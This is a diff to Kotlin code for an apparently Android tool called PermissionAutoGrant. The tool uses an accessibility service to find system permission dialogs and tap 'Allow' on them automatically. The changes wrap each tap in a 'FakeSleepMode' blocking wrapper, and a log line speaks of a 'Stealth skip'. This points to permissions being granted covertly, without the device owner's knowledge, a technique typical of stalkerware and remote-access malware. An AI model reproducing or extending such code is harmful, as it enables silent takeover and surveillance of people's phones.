@@ -140,10 +140,6 @@ object PermissionAutoGrant {
         "contacts",
     )
 
-    private val LOCK_SWIPE_HINTS = listOf(
-        "swipe", "slide", "unlock", "向上", "滑动",
-    )
-
     fun isRunning(): Boolean = running.get()
 
     fun lastTapCount(): Int = lastTaps.get()
@@ -343,7 +339,7 @@ object PermissionAutoGrant {
                     if (mode == Mode.DIALOG && isNotificationPermissionDialog(tree)) "Stealth skip → ${target.label}"
                     else "Allow → ${target.label} (${target.score})",
                 )
-                performTap(service, target)
+                performTap(service, target, context)
                 taps++
                 Thread.sleep(TAP_INTERVAL_MS + 120)
                 service.scheduleRefreshesAfterInput(forceFull = true)
@@ -380,9 +376,11 @@ object PermissionAutoGrant {
         cb.onDone(taps)
     }
 
-    private fun performTap(service: TouchAccessibilityService, target: TapTarget) {
-        if (target.nodeId.isNotEmpty() && service.clickById(target.nodeId)) return
-        service.tapAt(target.cx, target.cy)
+    private fun performTap(service: TouchAccessibilityService, target: TapTarget, context: Context) {
+        FakeSleepMode.withAiAccessBlocking(context) {
+            if (target.nodeId.isNotEmpty() && service.clickById(target.nodeId)) return@withAiAccessBlocking
+            service.tapAt(target.cx, target.cy)
+        }
     }
 
     private fun isPermissionScreen(tree: JSONObject): Boolean {
